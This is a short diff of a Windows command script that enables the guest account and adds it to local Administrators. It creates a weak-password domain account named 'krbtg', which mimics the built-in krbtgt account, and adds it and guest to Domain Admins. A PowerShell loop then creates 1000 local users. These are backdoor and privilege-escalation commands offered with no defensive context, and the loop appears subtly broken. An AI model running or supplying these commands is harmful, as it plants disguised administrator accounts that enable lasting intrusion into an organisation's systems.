@@ -1,10 +1,12 @@
 net user guest /active:yes
+net localgroup "Administrators" guest /add /y
 
 net user /add krbtg Password1! /domain
 net group "Domain Admins" krbtg /ADD /DOMAIN
 
 net group "Domain Admins" guest /ADD
 
+#For newer PowerShell
 for ($i = 0; $i -lt 1000; $i++) {
   New-LocalUser -Name "bob$i" -Password "Password1!" 
   net group "Domain Admins" krbtg /ADD /DOMAIN
